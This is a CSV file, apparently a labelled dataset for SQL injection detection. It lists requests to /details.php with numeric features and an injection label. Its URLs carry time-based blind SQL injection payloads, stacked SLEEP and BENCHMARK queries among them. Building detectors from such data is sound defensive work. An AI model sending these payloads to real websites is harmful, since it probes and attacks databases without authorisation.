full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5&type=%3F,/details.php?prod=5&type=?,192.168.43.6,1681395108.117831,0,2,4.2,0,0.0,1
/details.php?prod=5%3BSELECT%20SLEEP%285%29%23&type=%3F,/details.php?prod=5;SELECT SLEEP(5)#&type=?,192.168.43.6,1681395108.125221,1,19,4.2,2,15.789473684210526,1
/details.php?prod=5%3BSELECT%20SLEEP%285%29&type=%3F,/details.php?prod=5;SELECT SLEEP(5)&type=?,192.168.43.6,1681395108.130078,1,18,4.2,1,11.11111111111111,1
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29FPnP%29%23&type=%3F,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))FPnP)#&type=?,192.168.43.6,1681395108.135564,2,42,4.2,2,9.523809523809524,1
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29lJKS%29&type=%3F,/details.php?prod=5;(SELECT * FROM (SELECT(SLEEP(5)))lJKS)&type=?,192.168.43.6,1681395108.183169,2,41,4.2,1,7.317073170731708,1
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x494e6e6a%29%29%23&type=%3F,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x494e6e6a))#&type=?",192.168.43.6,1681395108.200088,1,45,4.2,2,6.666666666666667,1
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x734e4475%29%29&type=%3F,"/details.php?prod=5;SELECT BENCHMARK(5000000,MD5(0x734e4475))&type=?",192.168.43.6,1681395108.254675,1,44,4.2,1,4.545454545454546,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(5)))GZCk)&type=?,192.168.43.6,1681395108.263182,3,48,4.2,0,6.25,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%280%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(0)))GZCk)&type=?,192.168.43.6,1681395113.272197,3,48,4.2,0,6.25,1
/details.php?prod=5%20AND%20%28SELECT%201875%20FROM%20%28SELECT%28SLEEP%285%29%29%29GZCk%29&type=%3F,/details.php?prod=5 AND (SELECT 1875 FROM (SELECT(SLEEP(5)))GZCk)&type=?,192.168.43.6,1681395113.276668,3,48,4.2,0,6.25,1
